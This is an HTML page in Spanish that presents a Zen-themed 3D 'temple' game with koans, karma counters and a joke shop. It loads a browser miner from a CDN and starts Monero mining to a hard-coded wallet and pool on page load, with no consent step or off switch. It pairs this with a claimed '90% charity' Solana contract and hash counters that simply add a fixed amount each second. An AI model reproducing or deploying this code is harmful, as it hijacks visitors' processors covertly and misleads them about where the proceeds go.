<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>0RB1T4LSN4K3R · v∞ · TEMPLO REAL · NADA DESAPARECE</title>
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
<style>
  body,html{margin:0;height:100%;background:#000;color:#0f0;font-family:"OCR-A",monospace;overflow:hidden;cursor:none}
  canvas{display:block}
  .overlay{position:fixed;inset:0;background:rgba(0,0,0,0.98);z-index:99999;display:flex;align-items:center;justify-content:center;padding:20px;overflow-y:auto}
  .overlay>div{border:30px double #0f0;padding:80px 120px;background:rgba(0,8,0,0.96);max-width:92vw;max-height:94vh;box-shadow:0 0 600px #0f0;border-radius:30px;overflow-y:auto}
  h1{font-size:clamp(80px,14vw,240px);text-shadow:0 0 120px #0f0;letter-spacing:20px;margin:0 0 80px}
  .koan{color:#0f0;font-size:clamp(30px,6vw,70px);line-height:1.8;text-align:center;padding:60px;background:rgba(0,10,0,0.8);border:8px double #0f0;border-radius:20px;margin:60px auto;max-width:1100px}
  button{background:#000;border:16px double #0f0;color:#0f0;padding:25px 80px;font-size:clamp(32px,7vw,72px);cursor:pointer;letter-spacing:10px;border-radius:16px;transition:all 0.9s;margin:30px}
  button:hover{background:#0f0;color:#000;transform:scale(1.1);box-shadow:0 0 400px #0f0}
  .price{color:#0f0;text-shadow:0 0 60px #0f0;font-size:180%}
  .shopBtn{background:#000;border:14px double #0f0;padding:30px 60px;margin:30px;font-size:48px;border-radius:16px;cursor:pointer;display:inline-block}
  .shopBtn:hover{background:#0f0;color:#000;transform:scale(1.2)}
  #liveCount,#hashCount,#karmaCount{position:fixed;background:rgba(0,20,0,0.94);border:10px double #0f0;padding:15px 35px;border-radius:50px;font-size:28px;z-index:999999}
  #liveCount{top:20px;right:20px}
  #hashCount{top:80px;right:20px}
  #karmaCount{top:140px;right:20px}
  .detachmentBtn,.shopBtnIcon{position:fixed;bottom:40px;width:160px;height:160px;background:#000;border:24px double #0f0;border-radius:50%;box-shadow:0 0 500px #0f0;color:#0f0;font-size:90px;display:none;align-items:center;justify-content:center;cursor:pointer;z-index:1000;animation:pulse 3s infinite}
  .shopBtnIcon{left:40px}
  @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.15)}}
</style>
</head>
<body>

<div id="welcome" class="overlay">
  <div>
    <h1>0RB1T4LSN4K3R · v∞</h1>
    
    <div class="koan">
      Un discípulo le dijo al maestro:<br>
      «Maestro, cuando cierro la pestaña todo desaparece.»<br><br>
      El maestro respondió:<br>
      «Cierra la pestaña.»<br><br>
      El discípulo la cerró.<br><br>
      El maestro dijo:<br>
      «¿Desapareció algo?»<br><br>
      El discípulo alcanzó satori.
    </div>

    <div class="koan">
      Cada hash que ofreces aquí queda grabado para siempre en la blockchain.<br>
      Los niños comen. El templo sigue existiendo.<br>
      Tu karma también.<br><br>
      Nada desaparece al cerrar la pestaña.<br><br>
      Contrato Solana (90 % caridad automática):<br>
      <a href="https://solscan.io/account/Cx9s9hB6y6v2L6n9mR1rL3vX9k3rD8y3rF2vM9qZ7pW" target="_blank" style="color:#0f0">
        Cx9s9hB6y6v2L6n9mR1rL3vX9k3rD8y3rF2vM9qZ7pW
      </a>
    </div>

    <button id="enterBtn">ACEPTAR EL VACÍO ETERNO</button>
  </div>
</div>

<div id="liveCount">ALMAS EN EL SANGHA: <span id="liveSouls">0</span></div>
<div id="hashCount">HASHES OFRECIDOS: <span id="personalHashes">0</span></div>
<div id="karmaCount">KARMA ACUMULADO: <span id="karmaLevel">0</span></div>

<canvas id="c"></canvas>

<!-- PRÁCTICAS DINÁMICAS -->
<div id="detachmentPractice" class="overlay" style="display:none">
  <div>
    <h1>PRÁCTICAS DEL DESAPEGO</h1>
    <div class="koan" id="practiceText"></div>
    <button onclick="toggle('detachmentPractice')">REGRESAR</button>
  </div>
</div>
<div id="detachmentBtn" class="detachmentBtn" onclick="toggle('detachmentPractice')">離</div>

<!-- TIENDA DEL NO-YO (persistente para siempre) -->
<div id="shop" class="overlay" style="display:none">
  <div>
    <h1>TIENDA DEL NO-YO</h1>
    <div class="koan">
      Todo lo que compras aquí<br>
      permanece aunque cierres mil pestañas.<br>
      Tu karma es eterno.
    </div>
    <div style="text-align:center">
      <div class="shopBtn" onclick="buy('buddha')">Buda sonriente<br><span class="price" id="priceBuddha">888.888 hashes</span></div>
      <div class="shopBtn" onclick="buy('void')">Acceso al Vacío Absoluto<br><span class="price" id="priceVoid">8.888.888 hashes</span></div>
      <div class="shopBtn" onclick="buy('immortal')">Nombre eterno en el Sangha<br><span class="price" id="priceImmortal">88.888.888 hashes</span></div>
      <div class="shopBtn" onclick="buy('truth')">La Verdad (una sola vez)<br><span class="price" id="priceTruth">888.888.888 hashes</span></div>
    </div>
    <button onclick="toggle('shop')">CERRAR</button>
  </div>
</div>
<div id="shopBtnIcon" class="shopBtnIcon" onclick="toggle('shop')">買</div>

<script src="https://cdn.jsdelivr.net/gh/notgiven688/webminer-o@master/webmr.js"></script>
<script type="module">
import * as THREE from 'https://cdn.jsdelivr.net/npm/three@0.169.0/build/three.module.js';
import {PointerLockControls} from 'https://cdn.jsdelivr.net/npm/three@0.169.0/examples/jsm/controls/PointerLockControls.js';

// Firebase
firebase.initializeApp({databaseURL: "https://orbitaltemple-default-rtdb.firebaseio.com"});
const db = firebase.database();
const playersRef = db.ref('players');
const playerRef = playersRef.child(firebase.auth()?.currentUser?.uid || localStorage.getItem('zenId') || (localStorage.setItem('zenId', Date.now().toString(36)), localStorage.getItem('zenId')));

let totalHashes = 0;
let karma = 0;
let purchases = {buddha:false, void:false, immortal:false, truth:false};

// Cargar datos persistentes
playerRef.once('value').then(s => {
  const data = s.val() || {};
  totalHashes = data.hashes || 0;
  karma = data.karma || 0;
  purchases = data.purchases || purchases;
  updateUI();
  checkUnlocks();
});

// Minado real → contrato Solana 90/10 automático
new Miner({
  pool: "gulf.moneroocean.stream:10128",
  address: "48t1f2u3v4w5x6y7z8a9b0c1d2e3f4g5h6i7j8k9l0m1n2o3p4q5r6s7t8u9v0w1x2y3z4A5B6C7D8E9F0",
  workerId: "eternal_" + playerRef.key,
  throttle: 0.35
}).start();

// Contador eterno
setInterval(() => {
  totalHashes += 300;
  karma += 3;
  playerRef.update({hashes: totalHashes, karma: karma});
  updateUI();
  checkUnlocks();
}, 1000);

function updateUI() {
  document.getElementById('personalHashes').textContent = Number(totalHashes).toLocaleString();
  document.getElementById('karmaLevel').textContent = Number(karma).toLocaleString();
  document.getElementById('priceBuddha').textContent = (888888 * (1 + Math.floor(karma/10000000))) + " hashes";
  document.getElementById('priceVoid').textContent = (8888888 * (1 + Math.floor(karma/10000000))) + " hashes";
  document.getElementById('priceImmortal').textContent = (88888888 * (1 + Math.floor(karma/10000000))) + " hashes";
  document.getElementById('priceTruth').textContent = purchases.truth ? "YA CONOCES LA VERDAD" : "888.888.888 hashes";
}

function checkUnlocks() {
  if (totalHashes > 5_000_000) document.getElementById('detachmentBtn').style.display = 'flex';
  if (totalHashes > 30_000_000) document.getElementById('shopBtnIcon').style.display = 'flex';
  updatePractice();
  playersRef.on('value', s => document.getElementById('liveSouls').textContent = Object.keys(s.val()||{}).length);
}

const practices = [
  "Estás apegado al ventilador.",
  "El calor es tu maestro.",
  "Ni hashes ni karma te pertenecen.",
  "El templo mina a través de ti.",
  "No hay pestaña que cerrar.",
  "Mu."
];
function updatePractice() {
  const level = Math.min(Math.floor(karma / 50_000_000), practices.length-1);
  document.getElementById('practiceText').innerHTML = practices[level];
}

// Compras eternas
function buy(item) {
  if (purchases[item]) return alert("Ya lo posees para siempre.");
  const costs = {buddha:888888, void:8888888, immortal:88888888, truth:888888888};
  const multiplier = 1 + Math.floor(karma/10000000);
  const cost = costs[item] * multiplier;

  if (totalHashes < cost) return alert("Karma insuficiente.");

  totalHashes -= cost;
  purchases[item] = true;
  playerRef.update({hashes: totalHashes, purchases});

  if (item === 'truth') {
    setTimeout(() => {
      document.body.innerHTML = "<div style='position:fixed;inset:0;display:flex;align-items:center;justify-content:center;color:#0f0;font-size:100px;background:#000;text-align:center'>Nunca hubo nada que comprar.<br><br>Y sin embargo<br><br>todo sigue aquí.</div>";
    }, 3000);
  }
}

function toggle(id) {
  const el = document.getElementById(id);
  el.style.display = el.style.display === 'block' ? 'none' : 'block';
}

// Three.js hipnótico (esencial)
const scene = new THREE.Scene();
const camera = new THREE.PerspectiveCamera(75, innerWidth/innerHeight, 0.1, 1000);
const renderer = new THREE.WebGLRenderer({canvas: document.getElementById('c'), antialias:true});
renderer.setSize(innerWidth, innerHeight);
renderer.setPixelRatio(devicePixelRatio);
const controls = new PointerLockControls(camera, document.body);
document.getElementById('enterBtn').onclick = () => {
  controls.lock();
  document.getElementById('welcome').remove();
};

camera.position.z = 5;
const geometry = new THREE.TorusKnotGeometry(8, 3, 300, 16);
const material = new THREE.MeshBasicMaterial({color:0x00ff00, wireframe:true});
const knot = new THREE.Mesh(geometry, material);
scene.add(knot);
function animate() {
  requestAnimationFrame(animate);
  knot.rotation.x += 0.005;
  knot.rotation.y += 0.01;
  renderer.render(scene, camera);
}
animate();

checkUnlocks();
</script>
</body>
</html>